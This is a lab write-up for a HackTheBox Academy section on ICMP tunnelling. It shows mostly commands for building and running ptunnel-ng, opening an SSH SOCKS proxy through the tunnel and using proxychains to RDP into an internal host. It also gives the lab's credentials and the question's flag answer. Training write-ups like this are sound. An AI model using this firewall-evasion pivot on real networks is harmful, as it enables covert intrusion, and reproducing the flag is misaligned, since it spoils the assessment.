# ICMP Tunneling with SOCKS

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1438](https://academy.hackthebox.com/module/158/section/1438) |

---

## 🔑 Key Concepts

**ICMP Tunneling** — техніка приховування TCP трафіку всередині ICMP (ping) пакетів.
Використовується коли TCP/UDP порти заблоковані файрволом, але ICMP дозволений.

**ptunnel-ng** — інструмент що створює тунель через ICMP echo request/reply пакети.

### Схема атаки
```
Kali (ptunnel-ng client) 
  → ICMP пакети → 
    WEB01 (ptunnel-ng server)
      → TCP → 
        WEB01:22 (SSH)
          → SSH -D 9050 (SOCKS proxy)
            → proxychains →
              172.16.5.19 (Windows Target)
```

**Чому така схема:**
1. `ptunnel-ng server` на WEB01 — приймає ICMP пакети і перетворює їх на TCP з'єднання до SSH порту
2. `ptunnel-ng client` на Kali — слухає на `localhost:2222`, пакує TCP трафік в ICMP і відправляє на WEB01
3. `ssh -D 9050` через порт 2222 — підключається до WEB01 через ICMP тунель і створює SOCKS proxy
4. `proxychains` — направляє RDP трафік через SOCKS proxy до внутрішньої мережі

---

## 🛠️ Key Commands

### Збірка ptunnel-ng на WEB01 (якщо немає пакету)
```bash
# На WEB01 — компілюємо вручну
cd ~/ptunnel-ng
gcc -DPACKAGE_STRING=\"ptunnel-ng-1.42\" \
    -DPACKAGE_VERSION=\"1.42\" \
    -DPACKAGE_NAME=\"ptunnel-ng\" \
    -I src/ \
    -o ~/ptunnel-bin \
    src/ptunnel.c src/pdesc.c src/pkt.c src/options.c \
    src/utils.c src/challenge.c src/md5.c \
    -lpthread -lm
```

### ВІКНО 1 — Запуск сервера на WEB01
```bash
# ptunnel-ng server слухає ICMP пакети і форвардить на SSH порт (22)
ssh ubuntu@<pivot_host>
sudo ~/ptunnel-bin -r<pivot_host_ip> -R22
```

### ВІКНО 2 — Запуск клієнта на Kali
```bash
# ptunnel-ng client приймає TCP на порту 2222 і тунелює через ICMP до сервера
sudo ptunnel-ng -p<pivot_host_ip> -l2222 -r<pivot_host_ip> -R22
```

### ВІКНО 3 — SSH через ICMP тунель (SOCKS proxy)
```bash
# Підключаємось до WEB01 SSH через локальний порт 2222 (ICMP тунель)
# -D 9050 створює SOCKS proxy для proxychains
# -N означає тільки тунель без інтерактивної shell
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1 -N
# Пароль: HTB_@cademy_stdnt!
```

### Перевірка тунелю
```bash
ss -tlnp | grep 9050
# Має показати: ssh listening on 127.0.0.1:9050
```

### Якщо порт 9050 вже зайнятий
```bash
sudo kill $(lsof -t -i:9050)
```

### ВІКНО 4 — RDP через ICMP тунель
```bash
# Оновити proxychains конфіг
sudo bash -c 'cat > /etc/proxychains.conf << EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
EOF'

# RDP до внутрішнього таргету через тунель
proxychains xfreerdp3 /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore
```

---

## ❓ Questions

### Q1 — Contents of C:\Users\victor\Downloads\flag.txt
**Answer:** `N3Tw0rkTunnelV1sion!`

```bash
# ВІКНО 1 — WEB01: запуск ptunnel-ng сервера
ssh ubuntu@10.129.202.64
sudo ~/ptunnel-bin -r10.129.202.64 -R22

# ВІКНО 2 — Kali: запуск ptunnel-ng клієнта
sudo ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# ВІКНО 3 — Kali: SSH тунель через ICMP (SOCKS proxy)
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1 -N

# ВІКНО 4 — Kali: RDP до таргету
proxychains xfreerdp3 /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore
# CMD: type C:\Users\victor\Downloads\flag.txt
```
